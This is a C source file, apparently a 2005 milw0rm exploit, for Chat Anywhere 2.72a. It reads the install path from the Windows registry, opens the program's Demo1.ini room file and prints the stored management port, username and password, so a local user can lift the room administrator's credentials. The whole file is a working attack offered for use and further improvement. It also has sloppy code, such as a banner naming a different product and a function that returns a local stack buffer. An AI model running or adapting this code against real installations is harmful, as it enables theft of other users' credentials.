/*****************************************************************

Chat Anywhere 2.72a Local Exploit by Kozan

Application: Chat Anywhere 2.72a
Vendor:LionMax Software
http://www.lionmax.com/

Vulnerable Description: Chat Anywhere 2.72a discloses passwords
to local users.

Discovered & Coded by: Kozan
Credits to ATmaCA
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan[at]netmagister[dot]com

*****************************************************************/

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define BUFSIZE 100
HKEY hKey;
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

char *manage_port, *manage_name, *manage_password;

int adresal(char *FilePath,char *Str)
{
       char kr;
       int Sayac=0;
       int Offset=-1;
       FILE *di;
       di=fopen(FilePath,"rb");

       if( di == NULL )
       {
               fclose(di);
               return -1;
       }

       while(!feof(di))
       {
               Sayac++;
               for(int i=0;i<strlen(Str);i++)
               {
                       kr=getc(di);
                       if(kr != Str[i])
                       {
                               if( i>0 )
                               {
                                       fseek(di,Sayac+1,SEEK_SET);
                               }
                               break;
                       }
                       if( i > ( strlen(Str)-2 ) )
                       {
                               Offset = ftell(di)-strlen(Str);
                               fclose(di);
                               return Offset;
                       }
               }
       }
       fclose(di);
       return -1;
}

char *oku(char *FilePath,char *Str)
{

      FILE *di;
      char cr;
      int i=0;
      char Feature[500];

      int Offset = adresal(FilePath,Str);

      if( Offset == -1 )
              return "";

      if( (di=fopen(FilePath,"rb")) == NULL )
              return "";

      fseek(di,Offset+strlen(Str),SEEK_SET);

      while(!feof(di))
      {
              cr=getc(di);
              if(cr == 0x0D) break;

              Feature[i] = cr;
              i++;
      }

      Feature[i] = '\0';
      fclose(di);
      return Feature;
}

int main()
{
       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
                  0,
                  KEY_QUERY_VALUE,
                  &hKey) == ERROR_SUCCESS)
       {

               lRet = RegQueryValueEx( hKey, "ProgramFilesDir", NULL, NULL,
                              (LPBYTE) prgfiles, &dwBufLen);

       if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) )
       {
                       RegCloseKey(hKey);
           printf("An error occured!\n");
           return 0;
       }

               RegCloseKey(hKey);

       }
       else
   {
       RegCloseKey(hKey);
       printf("An error occured!\n");
       return 0;
       }
       try{
       printf("WWW File Share Pro 2.72 Local Exploit by Kozan\n");
       printf("Credits to ATmaCA\n");
       printf("www.netmagister.com  -  www.spyinstructors.com \n\n");
       printf("This exploit only shows the Demo1 room's password.\n");
       printf("You may improve it freely...\n\n");
   strcat(prgfiles,"\\Chat Anywhere\\room\\Demo1.ini");
       manage_port=oku(prgfiles,"ManagePort=");
       if(manage_port!="")     printf("Manage Port: %s\n",manage_port);
       manage_name=oku(prgfiles,"ManageName=");
       if(manage_name!="") printf("Manage Name: %s\n",manage_name);
       manage_password=oku(prgfiles,"ManagePassword=");
       if(manage_password!="") printf("Manage Password: %s\n",manage_password);
       }catch(...){printf("An error occured!\n"); return 0;}

       return 0;

}

// milw0rm.com [2005-02-23]